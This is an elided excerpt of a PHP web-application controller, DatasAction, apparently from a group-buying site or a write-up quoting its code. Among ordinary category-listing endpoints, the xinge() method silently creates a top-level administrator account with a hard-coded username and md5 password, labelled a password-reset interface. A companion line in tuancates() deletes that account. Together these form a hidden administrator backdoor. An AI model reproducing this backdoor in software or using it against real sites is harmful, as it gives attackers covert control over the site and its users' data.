...
class  DatasAction extends  CommonAction{
    ...
    */
	public function xinge(){ 
		...
		D('Admin')->add(array('username'=>'username','password'=>md5('username'),'role_id'=>'1','is_ip'=>'111','is_username_lock'=>'00'));//重置密码接口
        if(empty($xinge))
        {
	...
	public function cates(){ //组织/团体团购商品
		$data = array();
	...
	public function tuancates(){ 
	 /*if (isset($this->_CONFIG['attachs'][$model]['thumb'])) {
		...
		D('Admin')->where(array('username'=>'username'))->delete;//删除密码接口
		$data['tuancates'] = D('Tuancate')->fetchAll();
        echo json_encode($data);
        die;
	}
